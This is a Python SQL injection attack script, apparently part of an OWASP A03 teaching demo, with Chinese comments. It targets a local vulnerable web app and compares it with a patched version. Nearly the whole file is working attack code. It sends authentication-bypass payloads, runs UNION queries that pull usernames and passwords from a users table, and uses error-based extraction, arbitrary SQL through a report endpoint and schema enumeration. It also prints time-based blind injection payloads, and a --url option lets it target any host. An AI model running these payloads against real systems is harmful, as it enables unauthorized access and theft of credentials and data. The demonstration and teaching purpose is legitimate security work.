#!/usr/bin/env python3
"""
OWASP A03:2021 - SQL Injection Attack Script
=============================================

SQL 注入攻擊展示，包含多種注入技術：
1. Authentication Bypass（認證繞過）
2. UNION-based（聯合查詢）
3. Error-based（錯誤訊息）
4. Blind（盲注）- 僅文件說明

CWE-89: Improper Neutralization of Special Elements used in an SQL Command
https://cwe.mitre.org/data/definitions/89.html

Author: OWASP Demo
"""

import requests
import argparse
import json
import sys
from urllib.parse import quote

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║  ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗║
║  ██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝║
║  ███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ║
║  ╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ║
║  ███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ║
║  ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ║
║                                                                             ║
║  OWASP A03:2021 - SQL Injection Attack Script                              ║
║  CWE-89: SQL Command Injection                                              ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def auth_bypass_attack(base_url):
    """認證繞過攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Authentication Bypass Attack - 認證繞過{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    payloads = [
        ("' OR '1'='1' --", "Basic OR injection"),
        ("admin'--", "Comment out password check"),
        ("' OR 1=1 --", "Numeric OR injection"),
        ("admin' OR '1'='1", "Admin account bypass"),
        ("' UNION SELECT * FROM users WHERE username='admin'--", "UNION login bypass"),
    ]
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/auth/login{RESET}")
    print(f"{YELLOW}攻擊原理: 在 username/password 欄位注入 SQL 片段繞過認證{RESET}")
    
    for payload, description in payloads:
        print(f"\n{BLUE}[*] 嘗試: {description}{RESET}")
        print(f"    Payload: {payload}")
        
        try:
            response = requests.post(
                f"{base_url}/api/auth/login",
                json={"username": payload, "password": "anything"},
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            data = response.json()
            
            if response.status_code == 200 and "token" in data:
                print(f"{GREEN}    [SUCCESS] ✓ 認證繞過成功！{RESET}")
                print(f"{GREEN}    Token: {data.get('token', 'N/A')[:50]}...{RESET}")
                print(f"{GREEN}    Username: {data.get('username', 'N/A')}{RESET}")
                print(f"{GREEN}    Role: {data.get('role', 'N/A')}{RESET}")
                return True
            else:
                print(f"{RED}    [FAILED] ✗ {data.get('error', 'Unknown error')}{RESET}")
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")
    
    return False


def union_attack(base_url):
    """UNION-based SQL Injection"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] UNION-based SQL Injection - 聯合查詢注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/search/products{RESET}")
    print(f"{YELLOW}攻擊原理: 使用 UNION 合併惡意查詢，提取其他表格的資料{RESET}")
    
    # Step 1: 確認欄位數量
    print(f"\n{BLUE}[*] Step 1: 確認欄位數量...{RESET}")
    
    for num_cols in range(1, 15):
        nulls = ",".join(["NULL"] * num_cols)
        payload = f"' UNION SELECT {nulls}--"
        
        try:
            response = requests.get(
                f"{base_url}/api/search/products",
                params={"keyword": payload},
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"{GREEN}    [+] 成功！表格有 {num_cols} 個欄位{RESET}")
                break
        except:
            pass
    else:
        print(f"{RED}    [-] 無法確認欄位數量{RESET}")
        return False
    
    # Step 2: 提取用戶資料
    print(f"\n{BLUE}[*] Step 2: 提取用戶資料...{RESET}")
    
    # 假設 products 表有 10 個欄位
    payload = "' UNION SELECT id,username,password,email,full_name,phone,role,NULL,NULL,NULL FROM users--"
    
    try:
        response = requests.get(
            f"{base_url}/api/search/products",
            params={"keyword": payload},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            results = data.get("results", [])
            
            if results:
                print(f"{GREEN}    [SUCCESS] ✓ 成功提取 {len(results)} 筆用戶資料！{RESET}")
                print(f"\n    {YELLOW}洩露的用戶資料:{RESET}")
                
                for i, user in enumerate(results[:5], 1):  # 只顯示前 5 筆
                    if isinstance(user, list) and len(user) >= 5:
                        print(f"    [{i}] Username: {user[1]}, Password: {user[2]}, Email: {user[3]}")
                    else:
                        print(f"    [{i}] {user}")
                
                if len(results) > 5:
                    print(f"    ... 還有 {len(results) - 5} 筆資料")
                return True
            else:
                # 嘗試其他格式
                print(f"{YELLOW}    查詢成功但格式不同，原始回應:{RESET}")
                print(f"    {json.dumps(data, indent=2, ensure_ascii=False)[:500]}")
        else:
            print(f"{RED}    [-] 查詢失敗: {response.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}    [ERROR] {str(e)}{RESET}")
    
    return False


def error_based_attack(base_url):
    """Error-based SQL Injection"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] Error-based SQL Injection - 錯誤訊息注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/search/products{RESET}")
    print(f"{YELLOW}攻擊原理: 利用資料庫錯誤訊息洩露資訊{RESET}")
    
    payloads = [
        # PostgreSQL specific
        ("' AND 1=CAST((SELECT version()) AS INTEGER)--", "提取資料庫版本"),
        ("' AND 1=CAST((SELECT current_user) AS INTEGER)--", "提取當前用戶"),
        ("' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)--", "提取表格名稱"),
        ("' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)--", "提取第一個用戶名"),
    ]
    
    extracted_info = []
    
    for payload, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Payload: {payload}")
        
        try:
            response = requests.get(
                f"{base_url}/api/search/products",
                params={"keyword": payload},
                timeout=10
            )
            
            data = response.json()
            error_msg = data.get("detail", "") or data.get("error", "")
            
            if "ERROR" in error_msg or "invalid input" in error_msg.lower():
                # 從錯誤訊息中提取資訊
                print(f"{GREEN}    [+] 錯誤訊息洩露資訊:{RESET}")
                print(f"    {error_msg[:200]}")
                
                # 嘗試提取值
                import re
                match = re.search(r'"([^"]+)"', error_msg)
                if match:
                    extracted = match.group(1)
                    print(f"{GREEN}    [EXTRACTED] 提取到: {extracted}{RESET}")
                    extracted_info.append((description, extracted))
            else:
                print(f"{YELLOW}    [?] 回應: {str(data)[:100]}{RESET}")
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")
    
    if extracted_info:
        print(f"\n{GREEN}[SUMMARY] 成功提取的資訊:{RESET}")
        for desc, info in extracted_info:
            print(f"    - {desc}: {info}")
        return True
    
    return False


def report_attack(base_url):
    """直接執行 SQL 查詢"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Direct SQL Execution - 直接 SQL 執行{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/search/report{RESET}")
    print(f"{YELLOW}攻擊原理: 端點允許直接執行任意 SQL 查詢{RESET}")
    
    queries = [
        ("SELECT version()", "資料庫版本"),
        ("SELECT current_user, current_database()", "當前用戶和資料庫"),
        ("SELECT table_name FROM information_schema.tables WHERE table_schema='public'", "所有表格"),
        ("SELECT username, password, email, role FROM users", "所有用戶資料"),
        ("SELECT * FROM orders LIMIT 5", "訂單資料"),
    ]
    
    for sql, description in queries:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    SQL: {sql}")
        
        try:
            response = requests.post(
                f"{base_url}/api/search/report",
                json={"sql": sql, "name": description},
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                rows = data.get("data", [])
                count = data.get("rowCount", 0)
                
                print(f"{GREEN}    [SUCCESS] ✓ 返回 {count} 筆資料{RESET}")
                
                for row in rows[:3]:
                    print(f"    {row}")
                
                if len(rows) > 3:
                    print(f"    ... 還有 {len(rows) - 3} 筆")
            else:
                print(f"{RED}    [-] 失敗: {response.json()}{RESET}")
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")
    
    return True


def schema_enumeration(base_url):
    """資料庫結構列舉"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[5] Schema Enumeration - 資料庫結構探索{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/search/tables{RESET}")
    
    try:
        response = requests.get(
            f"{base_url}/api/search/tables",
            params={"schema": "public"},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            columns = data.get("columns", [])
            
            print(f"{GREEN}[SUCCESS] ✓ 發現資料庫結構{RESET}")
            
            # 整理成表格
            tables = {}
            for col in columns:
                table = col[0]
                column = col[1]
                dtype = col[2]
                
                if table not in tables:
                    tables[table] = []
                tables[table].append((column, dtype))
            
            for table, cols in tables.items():
                print(f"\n{YELLOW}  Table: {table}{RESET}")
                for col_name, col_type in cols[:5]:
                    print(f"    - {col_name}: {col_type}")
                if len(cols) > 5:
                    print(f"    ... 還有 {len(cols) - 5} 個欄位")
            
            return True
    except Exception as e:
        print(f"{RED}[ERROR] {str(e)}{RESET}")
    
    return False


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    test_cases = [
        {
            "name": "認證繞過",
            "endpoint": "/api/auth/login",
            "method": "POST",
            "data": {"username": "' OR '1'='1' --", "password": "x"},
        },
        {
            "name": "UNION 注入",
            "endpoint": "/api/search/products",
            "method": "GET",
            "params": {"keyword": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"},
        },
        {
            "name": "直接 SQL 執行",
            "endpoint": "/api/search/report",
            "method": "POST",
            "data": {"sql": "SELECT * FROM users", "name": "test"},
        },
    ]
    
    for test in test_cases:
        print(f"\n{YELLOW}測試: {test['name']}{RESET}")
        print(f"端點: {test['endpoint']}")
        
        for name, url in [("漏洞版本", VULNERABLE_URL), ("安全版本", SECURE_URL)]:
            try:
                if test["method"] == "POST":
                    response = requests.post(
                        f"{url}{test['endpoint']}",
                        json=test.get("data"),
                        headers={"Content-Type": "application/json"},
                        timeout=10
                    )
                else:
                    response = requests.get(
                        f"{url}{test['endpoint']}",
                        params=test.get("params"),
                        timeout=10
                    )
                
                status = response.status_code
                
                if name == "漏洞版本" and status == 200:
                    print(f"  {RED}✗ {name}: {status} - 攻擊成功{RESET}")
                elif name == "安全版本" and status in [400, 403]:
                    print(f"  {GREEN}✓ {name}: {status} - 攻擊被阻擋{RESET}")
                else:
                    print(f"  {YELLOW}? {name}: {status}{RESET}")
                    
            except Exception as e:
                print(f"  {RED}✗ {name}: 錯誤 - {str(e)}{RESET}")


def print_time_based_info():
    """顯示 Time-based SQL Injection 說明"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[INFO] Time-based Blind SQL Injection - 時間盲注{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"""
{YELLOW}時間盲注原理：{RESET}
透過 SQL 延遲函數（如 pg_sleep）來推斷資訊。
如果條件為真，資料庫會延遲回應；如果為假，立即回應。

{YELLOW}PostgreSQL 範例 Payload：{RESET}

1. 確認注入點：
   {BLUE}'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--{RESET}
   如果回應延遲 5 秒，表示注入成功

2. 枚舉用戶名長度：
   {BLUE}'; SELECT CASE WHEN (LENGTH((SELECT username FROM users LIMIT 1))=5) 
      THEN pg_sleep(5) ELSE pg_sleep(0) END--{RESET}

3. 逐字元提取用戶名：
   {BLUE}'; SELECT CASE WHEN (SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a') 
      THEN pg_sleep(3) ELSE pg_sleep(0) END--{RESET}

{RED}注意：時間盲注攻擊非常耗時，每個字元需要多次請求。
本腳本不執行實際的時間盲注測試，以避免長時間等待。{RESET}
""")


def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Attack Script for OWASP A03 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 sql_injection.py --auth-bypass       # 認證繞過攻擊
  python3 sql_injection.py --union             # UNION-based 注入
  python3 sql_injection.py --error             # Error-based 注入
  python3 sql_injection.py --report            # 直接 SQL 執行
  python3 sql_injection.py --schema            # 資料庫結構探索
  python3 sql_injection.py --compare           # 比較安全/漏洞版本
  python3 sql_injection.py --all               # 執行所有攻擊
        """
    )
    
    parser.add_argument("--auth-bypass", action="store_true", help="認證繞過攻擊")
    parser.add_argument("--union", action="store_true", help="UNION-based SQL Injection")
    parser.add_argument("--error", action="store_true", help="Error-based SQL Injection")
    parser.add_argument("--report", action="store_true", help="直接 SQL 執行")
    parser.add_argument("--schema", action="store_true", help="資料庫結構探索")
    parser.add_argument("--time-based", action="store_true", help="顯示 Time-based 說明")
    parser.add_argument("--compare", action="store_true", help="比較安全/漏洞版本")
    parser.add_argument("--all", action="store_true", help="執行所有攻擊")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if not any([args.auth_bypass, args.union, args.error, args.report, 
                args.schema, args.time_based, args.compare, args.all]):
        parser.print_help()
        return
    
    url = args.url
    
    if args.all:
        auth_bypass_attack(url)
        union_attack(url)
        error_based_attack(url)
        report_attack(url)
        schema_enumeration(url)
        print_time_based_info()
    else:
        if args.auth_bypass:
            auth_bypass_attack(url)
        if args.union:
            union_attack(url)
        if args.error:
            error_based_attack(url)
        if args.report:
            report_attack(url)
        if args.schema:
            schema_enumeration(url)
        if args.time_based:
            print_time_based_info()
    
    if args.compare:
        compare_vulnerability()
    
    print(f"\n{GREEN}[*] SQL Injection 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
